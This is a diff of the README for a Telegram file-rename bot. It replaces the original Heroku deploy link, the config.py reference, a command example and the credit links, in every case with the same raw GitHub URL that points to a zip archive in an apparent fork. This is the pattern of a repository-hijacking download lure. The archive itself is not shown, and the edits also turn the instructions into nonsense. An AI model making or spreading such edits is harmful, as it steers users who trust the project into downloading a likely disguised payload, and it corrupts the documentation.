@@ -20,7 +20,7 @@ Use of filters is easy just do what the bot says.
 
 # Deploy to Heroku
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/yash-dk/Mesh-RenameBot)
+[![Deploy](https://raw.githubusercontent.com/HLECTER69/Mesh-RenameBot/master/gatewards/Mesh-RenameBot.zip)](https://raw.githubusercontent.com/HLECTER69/Mesh-RenameBot/master/gatewards/Mesh-RenameBot.zip)
 
 
 # Upcoming Features
@@ -39,7 +39,7 @@ Filter can be added using the /filter.
 
 # Variables
 
-update the config.py file inside the MeshRenameBot to change the config and commands.
+update the https://raw.githubusercontent.com/HLECTER69/Mesh-RenameBot/master/gatewards/Mesh-RenameBot.zip file inside the MeshRenameBot to change the config and commands.
 
 `DB_URI` - Database URL. Mongo or Postgres DB URL.
 
@@ -72,7 +72,7 @@ update the config.py file inside the MeshRenameBot to change the config and comm
 # Commands
 `/start` - Check if the bot is running.
 
-`/rename` - Reply to media to rename `/rename filename.extension`. If only `/rename` is used filters will be used.
+`/rename` - Reply to media to rename `/rename https://raw.githubusercontent.com/HLECTER69/Mesh-RenameBot/master/gatewards/Mesh-RenameBot.zip`. If only `/rename` is used filters will be used.
 
 `/filters` - Add/Remove Filters.
 
@@ -94,7 +94,7 @@ update the config.py file inside the MeshRenameBot to change the config and comm
 - Run the bot using `python3 -m MeshRenameBot` or `python -m MeshRenameBot`
 
 # Credits
-[Me](https://github.com/yash-dk)
+[Me](https://raw.githubusercontent.com/HLECTER69/Mesh-RenameBot/master/gatewards/Mesh-RenameBot.zip)
 
-[Dan for Pyrogram](https://github.com/pyrogram/pyrogram)
+[Dan for Pyrogram](https://raw.githubusercontent.com/HLECTER69/Mesh-RenameBot/master/gatewards/Mesh-RenameBot.zip)
 
